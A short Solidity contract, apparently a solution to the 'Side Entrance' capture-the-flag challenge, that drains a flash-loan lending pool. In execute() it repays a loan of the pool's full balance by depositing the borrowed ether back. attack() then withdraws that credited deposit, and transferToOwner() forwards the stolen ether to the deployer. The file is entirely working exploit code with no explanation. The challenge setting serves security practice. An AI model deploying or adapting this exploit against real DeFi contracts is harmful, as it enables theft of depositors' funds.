// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool{
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceProxy{
    ISideEntranceLenderPool sideEntrance;
    address owner;

    constructor(address _sideEntrance){
        owner = msg.sender;
        sideEntrance = ISideEntranceLenderPool(_sideEntrance);
    }

    function execute() external payable{
        sideEntrance.deposit{ value: msg.value }();
    }

    function attack() public {
        uint256 balance = address(sideEntrance).balance;
        sideEntrance.flashLoan(balance);
        sideEntrance.withdraw();
    }

    function transferToOwner() public {
        uint balance = address(this).balance;
        payable(owner).call{value: balance}("");
    }
    fallback() external payable {}
}